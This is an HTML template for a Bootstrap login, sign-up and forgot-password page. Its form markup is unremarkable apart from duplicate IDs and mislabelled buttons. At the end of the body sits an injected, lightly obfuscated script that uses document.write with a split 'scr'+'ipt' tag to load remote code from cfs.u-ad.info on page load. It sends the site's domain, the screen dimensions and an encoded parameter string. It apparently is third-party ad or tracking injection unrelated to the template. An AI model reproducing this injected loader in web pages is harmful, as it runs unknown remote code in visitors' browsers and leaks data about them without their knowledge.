<!DOCTYPE html>
<html lang="en">
<head>
  <title>Bootstrap Example</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
</head>
<body>
    <div class="container">    
        <div id="loginbox" style="margin-top:50px;" class="mainbox col-md-6 col-md-offset-3 col-sm-8 col-sm-offset-2">                    
            <div class="panel panel-info" >
                <div class="panel-heading">
                    <div class="panel-title">Sign In</div>
                    <div style="float:right; font-size: 80%; position: relative; top:-10px"><a href="#" onClick="$('#loginbox').hide(); $('#signupbox').hide(); $('#forgetbox').show()">Forgot password?</a></div>
                </div>     

                <div style="padding-top:30px" class="panel-body" >

                    <div style="display:none" id="login-alert" class="alert alert-danger col-sm-12"></div>
                        
                    <form id="loginform" class="form-horizontal" role="form" method="post" action="login">
                                
                        <div style="margin-bottom: 25px" class="input-group">
                            <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
                            <input id="login-username" type="text" class="form-control" name="email_user" value="" placeholder="email">                                        
                        </div>        
                        <div style="margin-bottom: 25px" class="input-group">
                                    <span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>
                                    <input id="login-password" type="password" class="form-control" name="password_user" placeholder="password">
                                </div>
                        <div class="input-group">
                            <div class="checkbox">
                                <label>
                                  <input id="login-remember" type="checkbox" name="remember" value="1"> Remember me
                                </label>
                              </div>
                            </div>
                        <div style="margin-top:10px" class="form-group">
                            <!-- Button -->

                            <div class="col-sm-12 controls">
                              <button id="btn-signin" type="submit" class="btn btn-success">Login  </button>
                              <a id="btn-fblogin" href="#" class="btn btn-primary">Login with Facebook</a>
                            </div>
                        </div>
                        <div class="form-group">
                            <div class="col-md-12 control">
                                <div style="border-top: 1px solid#888; padding-top:15px; font-size:85%" >
                                    Don't have an account! 
                                <a href="#" onClick="$('#loginbox').hide(); $('#forgetbox').hide(); $('#signupbox').show()">
                                    Sign Up Here
                                </a>
                                </div>
                            </div>
                        </div>    
                    </form>     
                </div>                     
            </div>  
        </div>

        <div id="signupbox" style="display:none; margin-top:50px" class="mainbox col-md-6 col-md-offset-3 col-sm-8 col-sm-offset-2">
            <div class="panel panel-info">
                <div class="panel-heading">
                    <div class="panel-title">Sign Up</div>
                    <div style="float:right; font-size: 85%; position: relative; top:-10px"><a id="signinlink" href="#" onclick="$('#signupbox').hide(); $('#loginbox').show()">Sign In</a></div>
                </div>  
                <div class="panel-body" >
                    <form id="signupform" class="form-horizontal" role="form" method="post" action="register">
                        
                        <div id="signupalert" style="display:none" class="alert alert-danger">
                            <p>Error:</p>
                            <span></span>
                        </div>
                        <div class="form-group">
                            <label for="email" class="col-md-3 control-label">Email</label>
                            <div class="col-md-9">
                                <input type="text" class="form-control" name="email_user" placeholder="Email Address">
                            </div>
                        </div>
                            
                        <div class="form-group">
                            <label for="firstname" class="col-md-3 control-label">Name</label>
                            <div class="col-md-9">
                                <input type="text" class="form-control" name="name_user" placeholder="Your Name">
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="password" class="col-md-3 control-label">Password</label>
                            <div class="col-md-9">
                                <input type="password" class="form-control" name="password_user" placeholder="Password">
                            </div>
                        </div>
                            
                        <div class="form-group">
                            <label for="password" class="col-md-3 control-label">Retype Password</label>
                            <div class="col-md-9">
                                <input type="password" class="form-control" name="retype_password_user" placeholder="Retype Password">
                            </div>
                        </div>

                        <div class="form-group">
                            <!-- Button -->                                        
                            <div class="col-md-offset-3 col-md-9">
                                <button id="btn-signup" type="submit" class="btn btn-info"><i class="icon-hand-right"></i> &nbsp Sign Up</button>
                                <span style="margin-left:8px;">or</span>  
                            </div>
                        </div>
                        
                        <div style="border-top: 1px solid #999; padding-top:20px"  class="form-group">
                            
                            <div class="col-md-offset-3 col-md-9">
                                <button id="btn-fbsignup" type="button" class="btn btn-primary"><i class="icon-facebook"></i>   Sign Up with Facebook</button>
                            </div>                                           
                                
                        </div>
                    </form>
                 </div>
            </div>
        </div>

        <div id="forgetbox" style="display:none; margin-top:50px;" class="mainbox col-md-6 col-md-offset-3 col-sm-8 col-sm-offset-2">                    
            <div class="panel panel-info" >
                <div class="panel-heading">
                    <div class="panel-title">Forget</div>
                </div>     

                <div style="padding-top:30px" class="panel-body" >

                    <div style="display:none" id="login-alert" class="alert alert-danger col-sm-12"></div>
                        
                    <form id="loginform" class="form-horizontal" role="form" method="post" action="forgetpassword">
                                
                        <div style="margin-bottom: 25px" class="input-group">
                            <span class="input-group-addon"><i class="glyphicon glyphicon-user"></i></span>
                            <input id="login-username" type="text" class="form-control" name="email_user" value="" placeholder="email">                                        
                        </div>        
                        <div style="margin-top:10px" class="form-group">
                            <!-- Button -->
                            <div class="col-sm-12 controls">
                              <button id="btn-signin" type="submit" class="btn btn-success">Login  </button>
                              <a id="btn-fblogin" href="#" class="btn btn-primary">Login with Facebook</a>
                            </div>
                        </div>
                        <div class="form-group">
                            <div class="col-md-12 control">
                                <div style="border-top: 1px solid#888; padding-top:15px; font-size:85%" >
                                    Don't have an account! 
                                <a href="#" onClick="$('#loginbox').hide(); $('#forgetbox').hide(); $('#signupbox').show()">
                                    Sign Up Here
                                </a>
                                </div>
                            </div>
                        </div>    
                    </form>     
                </div>                     
            </div>  
        </div>

    </div>
    
<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&enc=telkom2");document.write("&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlR9CLUGYaPlEwKQuAgUwEmMAU3OU1Lh7TU1m8fA5MUNjg%2besoxUFmRa0MACGPttYCIMPzQy5omlc0d%2frF1%2fVzu6mdCyZj3Q3DeeM%2bMaHjldK5sMxHKgio%2b2i2uUru2SstVk2L%2fY3ji5ijmv7zplh6rx49z5a6veD%2buNrdRYiTAqBSWGi4l5COsq8VOrJDKwDoOj2N4IkF6j82lhQf7seKY%2fTPSJN%2fdhmkQwKijJXtTnxAIY0shHylMGTqoJGXL6x126zwY%2fviTiBI96Owax5lgtUJZxC3OCLj7W28LbvmeK8HC9%2bT2BQ15%2buXOyPMPTOILjtJsDoHSeTXEEoIgE7jyC35HLQDgO%2bQb%2fCVDroL9BIdDabw1RVUwuTxnXP%2bB70NmBquhLa%2b%2fqkSEspu4XFShhzLvjlIyS2jJ6iBrIHzv1UHLaygDkZ9tE%2fTrrbk0J2%2bUFBDyCxuYJrcD5uu5dr%2bWRC%2fYVH7EooDYIpQJ0OgabfMO5EUHNclrthWEdYXSjSvkzuYmwN8evaNAxDWg2vU67IhWkcmuhkJx5m7BmV1M06jQWi3k%2folXtoEOEKNfSvYJu47BzhysRS0%3d");document.write("&idc_r="+idc_glo_r);document.write("&domain="+document.domain);document.write("&sw="+screen.width+"&sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
</html>
